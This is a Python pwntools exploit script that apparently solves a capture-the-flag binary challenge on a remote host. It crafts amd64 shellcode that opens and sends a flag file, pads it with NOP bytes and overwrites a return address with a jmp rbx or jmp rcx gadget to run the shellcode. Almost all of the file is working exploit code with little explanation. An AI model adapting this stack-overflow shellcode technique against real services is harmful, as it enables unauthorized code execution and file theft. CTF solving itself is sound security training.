#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chal --host host5.metaproblems.com --port 7527
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chal')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'host5.metaproblems.com'
port = int(args.PORT or 7527)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x400000)
# Stack:      Executable
# RWX:        Has RWX segments
# Stripped:   No

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

shellcode = shellcraft.amd64.linux.openat(constants.AT_FDCWD, "/tmp/flag.txt", constants.O_RDONLY)
shellcode += shellcraft.amd64.linux.sendfile(constants.STDOUT_FILENO, 'rax', 0, 0x64)
shellcode = asm(shellcode)

rop = ROP(exe)


if args.LOCAL:
	jmp_rbx = 0x000000000040197a
	payload =  shellcode.ljust(88, b'\x90') 
	payload += p64(jmp_rbx) 
	payload += shellcode.ljust(88, b'\x90') * 4
	io.sendlineafter(b"Syscall me maybe?: ", payload)
	io.recvuntil(b"\x90\x90\x90\x90\x90\x90\x90\x90\x90z\x19@")
	flag = io.recvregex(br'MetaCTF{.*?}')
	log.success(f"FLAG : \033[1;33m{flag.decode()}\033[1;0m")
else :
	jmp_rcx = 0x000000000040197c
	payload =  shellcode.ljust(88, b'\x90') 
	payload += p64(jmp_rcx) 
	io.sendlineafter(b"Syscall me maybe?: ", payload)
	io.recvuntil(b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90|\x19@")
	flag = io.recvregex(br'MetaCTF{.*?}')
	log.success(f"FLAG : \033[1;33m{flag.decode()}\033[1;0m")
	


